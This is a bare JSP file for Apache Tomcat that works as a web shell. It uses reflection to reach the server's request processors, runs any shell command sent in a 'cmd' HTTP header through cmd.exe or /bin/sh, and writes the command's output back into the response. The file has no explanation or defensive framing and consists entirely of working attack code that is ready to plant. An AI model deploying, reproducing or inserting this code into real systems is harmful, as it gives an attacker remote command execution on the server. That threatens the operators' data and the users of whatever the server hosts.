<%@ page import="org.apache.tomcat.util.buf.ByteChunk" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    boolean flag = false;
    ThreadGroup group = Thread.currentThread().getThreadGroup();
    java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
    f.setAccessible(true);
    Thread[] threads = (Thread[]) f.get(group);

    for(int i = 0; i < threads.length; i++) {
        try{
            Thread t = threads[i];
            if (t == null) continue;

            String str = t.getName();
            if (str.contains("exec") || !str.contains("http")) continue;


            f = t.getClass().getDeclaredField("target");
            f.setAccessible(true);
            Object obj = f.get(t);

            if (!(obj instanceof Runnable)) continue;

            f = obj.getClass().getDeclaredField("this$0");
            f.setAccessible(true);
            obj = f.get(obj);

            try{
                f = obj.getClass().getDeclaredField("handler");
            }catch (NoSuchFieldException e){
                f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
            }
            f.setAccessible(true);
            obj = f.get(obj);

            try{
                f = obj.getClass().getSuperclass().getDeclaredField("global");
            }catch(NoSuchFieldException e){
                f = obj.getClass().getDeclaredField("global");
            }
            f.setAccessible(true);
            obj = f.get(obj);

            f = obj.getClass().getDeclaredField("processors");
            f.setAccessible(true);
            java.util.List processors = (java.util.List)(f.get(obj));

            for(int j = 0; j < processors.size(); ++j) {
                Object processor = processors.get(j);
                f = processor.getClass().getDeclaredField("req");
                f.setAccessible(true);
                Object req = f.get(processor);
                Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);

                str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});

                if (str != null && !str.isEmpty()) {
                    resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                    byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();

                    try {
                        Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                        obj = cls.newInstance();
                        cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    } catch (NoSuchMethodException var5) {
                        Class cls = Class.forName("java.nio.ByteBuffer");
                        obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                        resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                    }

                    flag = true;
                }

                if (flag) break;
            }

            if (flag)  break;
        }catch(Exception e){
            continue;
        }
    }
%>